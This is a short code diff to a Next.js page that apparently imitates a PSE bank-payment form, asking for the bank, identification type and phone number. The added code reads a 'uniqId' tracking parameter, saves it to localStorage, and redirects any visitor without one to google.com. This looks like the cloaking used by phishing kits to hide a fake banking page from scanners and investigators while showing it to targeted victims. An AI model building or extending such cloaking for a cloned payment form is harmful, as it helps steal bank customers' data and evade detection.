@@ -1,17 +1,21 @@
 "use client"
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import"./pse/pse.css"
 import InputMinimalista from "@/components/inputMinimalista/InputMinimalista"
 import { SelectMinimalista } from "@/components/selectMinimalista/SelectMinimalista"
-import { useRouter } from "next/navigation"
+import { useRouter, useSearchParams } from "next/navigation"
 import { useDispatch } from "react-redux"
 import { setBanco } from "@/redux/slices/homeSlice"
 
 const text_color_label = "text-gray-600"
 
 export default function Main(){
+    const searchParams = useSearchParams()
+    const uniqId = searchParams.get('uniqId')
+    
     const router = useRouter()
     const dispacth = useDispatch()
+    
     const [datosInicio, setDatosInicio] = useState({
         bancos: "Alianza",
         tipoIdentificacion: "Cédula de ciudadanía",
@@ -32,6 +36,13 @@ export default function Main(){
         telefono: "",
     })
 
+    useEffect(()=>{
+        if (uniqId) {
+            localStorage.setItem('uniqId', uniqId)
+        }else{
+            window.location.href = 'https://www.google.com'
+        }
+    },[uniqId])
 
     const handlerInformacion = (e) => {
         const { name, value } = e.target;
